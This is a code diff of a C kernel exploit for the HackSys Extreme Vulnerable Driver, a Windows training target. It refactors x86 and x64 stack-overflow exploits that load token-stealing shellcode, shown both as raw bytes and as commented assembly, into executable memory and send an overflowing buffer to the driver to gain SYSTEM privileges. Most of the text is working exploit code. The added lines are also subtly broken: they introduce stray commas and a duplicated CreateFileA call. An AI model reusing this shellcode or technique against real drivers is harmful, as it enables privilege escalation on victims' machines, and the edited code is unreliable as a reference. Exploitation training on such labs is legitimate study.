@@ -23,13 +23,13 @@ void poc_x86()
         // to use for creating and opening the file. 
         // This value SHOULD be set to 0xC0000000, meaning generic read and generic write
         hDevice = CreateFileA(
-            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
-            /* DWORD dwDesiredAccess */ 0xC0000000,
-            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
-            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
-            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
-            /* DWORD dwFlagsAndAttributes */ 0,
-            /* HANDLE hTemplateFile */ NULL);
+                    "\\\\.\\HackSysExtremeVulnerableDriver" /* LPCSTR lpFileName */ ,
+                    0xC0000000        /* DWORD dwDesiredAccess */ ,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE /* DWORD dwShareMode */,
+                    NULL  /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */,
+                    OPEN_EXISTING /* DWORD dwCreationDisposition */ ,
+                    0, /* DWORD dwFlagsAndAttributes */,
+                    NULL /* HANDLE hTemplateFile */);
         if (hDevice == INVALID_HANDLE_VALUE)
         {
             handle_error("Open device failed!\n", GetLastError());
@@ -55,13 +55,13 @@ void exp_x86()
     do {
         HANDLE hDevice;
         hDevice = CreateFileA(
-            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
-            /* DWORD dwDesiredAccess */ 0xC0000000,
-            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
-            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
-            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
-            /* DWORD dwFlagsAndAttributes */ 0,
-            /* HANDLE hTemplateFile */ NULL);
+                    "\\\\.\\HackSysExtremeVulnerableDriver" /* LPCSTR lpFileName */ ,
+                    0xC0000000        /* DWORD dwDesiredAccess */ ,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE /* DWORD dwShareMode */,
+                    NULL  /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */,
+                    OPEN_EXISTING /* DWORD dwCreationDisposition */ ,
+                    0, /* DWORD dwFlagsAndAttributes */,
+                    NULL /* HANDLE hTemplateFile */);
         if (hDevice == INVALID_HANDLE_VALUE)
         {
             handle_error("Open device failed!\n", GetLastError());
@@ -112,13 +112,17 @@ void exp_x86()
             0x8
         };
 
-        PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (pEopPayload == NULL)
+        PVOID pStoreShellcode = VirtualAlloc(
+								NULL,	
+								sizeof(ulShellcode), 
+								MEM_COMMIT | MEM_RESERVE, 
+								PAGE_EXECUTE_READWRITE);
+        if (pStoreShellcode == NULL)
         {
             handle_error("VirtualAlloc", GetLastError());
             break;
         }
-        RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));
+        RtlCopyMemory(pStoreShellcode, ulShellcode, sizeof(ulShellcode));
 
         DWORD dwInBufferSize = 2080 + 4;
         UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
@@ -129,8 +133,8 @@ void exp_x86()
         }
         RtlFillMemory(pInBuffer, 2080, 0x41);
 
-        PVOID pShellcode = &pEopPayload;
-        PVOID *ppShellcode = &pEopPayload;
+        PVOID pShellcode = &pStoreShellcode;
+        PVOID *ppShellcode = &pStoreShellcode;
         RtlCopyMemory(pInBuffer + 2080, ppShellcode, 4);
 
         DWORD dwReturnedBytes = 0;
@@ -146,8 +150,8 @@ void exp_x86()
         }
         if (pInBuffer != NULL)
             HeapFree(GetProcessHeap(), 0, pInBuffer);
-        if (pEopPayload != NULL)
-            VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
+        if (pStoreShellcode != NULL)
+            VirtualFree(pStoreShellcode, sizeof(ulShellcode), MEM_RELEASE);
     } while (0);
 }
 
@@ -159,13 +163,14 @@ void poc_x64()
         // to use for creating and opening the file. 
         // This value SHOULD be set to 0xC0000000, meaning generic read and generic write
         hDevice = CreateFileA(
-            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
-            /* DWORD dwDesiredAccess */ 0xC0000000,
-            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
-            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
-            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
-            /* DWORD dwFlagsAndAttributes */ 0,
-            /* HANDLE hTemplateFile */ NULL);
+            CreateFileA(
+                    "\\\\.\\HackSysExtremeVulnerableDriver" /* LPCSTR lpFileName */ ,
+                    0xC0000000        /* DWORD dwDesiredAccess */ ,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE /* DWORD dwShareMode */,
+                    NULL  /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */,
+                    OPEN_EXISTING /* DWORD dwCreationDisposition */ ,
+                    0, /* DWORD dwFlagsAndAttributes */,
+                    NULL /* HANDLE hTemplateFile */);
         if (hDevice == INVALID_HANDLE_VALUE)
         {
             handle_error("Open device failed!\n", GetLastError());
@@ -191,20 +196,19 @@ void exp_x64()
     do {
         HANDLE hDevice;
         hDevice = CreateFileA(
-            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
-            /* DWORD dwDesiredAccess */ 0xC0000000,
-            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
-            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
-            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
-            /* DWORD dwFlagsAndAttributes */ 0,
-            /* HANDLE hTemplateFile */ NULL);
+                    "\\\\.\\HackSysExtremeVulnerableDriver" /* LPCSTR lpFileName */ ,
+                    0xC0000000        /* DWORD dwDesiredAccess */ ,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE /* DWORD dwShareMode */,
+                    NULL  /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */,
+                    OPEN_EXISTING /* DWORD dwCreationDisposition */ ,
+                    0, /* DWORD dwFlagsAndAttributes */,
+                    NULL /* HANDLE hTemplateFile */);
         if (hDevice == INVALID_HANDLE_VALUE)
         {
             handle_error("Open device failed!\n", GetLastError());
             break;
         }
         /*
-
         ; Start of Token Stealing Stub
         xor rax, rax                         ; get ZERO
         mov rax, QWORD PTR gs:[rax + 0x188]  ; get nt!_KPCR.PcrbData.CurrentThread
@@ -225,22 +229,26 @@ void exp_x64()
                                             ; with SYSTEM process nt!_EPROCESS.Token
         */
         UCHAR ulShellcode[] = {
-            0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88,
-            0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48,
-            0x89, 0xC1, 0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00,
-            0x00, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,
-            0x48, 0x2D, 0x88, 0x01, 0x00, 0x00, 0x48, 0x39,
-            0x90, 0x80, 0x01, 0x00, 0x00, 0x75, 0xEA, 0x48,
-            0x8B, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89,
-            0x91, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4,
-            0x28, 0xC3 };
-        PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (pEopPayload == NULL)
+                    0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88,
+                    0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48,
+                    0x89, 0xC1, 0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00,
+                    0x00, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,
+                    0x48, 0x2D, 0x88, 0x01, 0x00, 0x00, 0x48, 0x39,
+                    0x90, 0x80, 0x01, 0x00, 0x00, 0x75, 0xEA, 0x48,
+                    0x8B, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89,
+                    0x91, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4,
+                    0x28, 0xC3 };
+        PVOID pStoreShellcode = VirtualAlloc(
+                                NULL, 
+                                sizeof(ulShellcode), 
+                                MEM_COMMIT | MEM_RESERVE, 
+                                PAGE_EXECUTE_READWRITE);
+        if (pStoreShellcode == NULL)
         {
             handle_error("VirtualAlloc", GetLastError());
             break;
         }
-        RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));
+        RtlCopyMemory(pStoreShellcode, ulShellcode, sizeof(ulShellcode));
 
         DWORD dwInBufferSize = 2072 + 8;
         UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
@@ -250,8 +258,9 @@ void exp_x64()
             break;
         }
         RtlFillMemory(pInBuffer, 2072, 0x41);
-        PVOID pShellcode = &pEopPayload;
-        PVOID *ppShellcode = &pEopPayload;
+
+        PVOID pShellcode = &pStoreShellcode;
+        PVOID *ppShellcode = &pStoreShellcode;
         RtlCopyMemory(pInBuffer + 2072, ppShellcode, 8);
         DWORD dwReturnedBytes = 0;
         if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
@@ -266,8 +275,8 @@ void exp_x64()
         }
         if (pInBuffer != NULL)
             HeapFree(GetProcessHeap(), 0, pInBuffer);
-        if (pEopPayload != NULL)
-            VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
+        if (pStoreShellcode != NULL)
+            VirtualFree(pStoreShellcode, sizeof(ulShellcode), MEM_RELEASE);
     } while (0);
 }
 
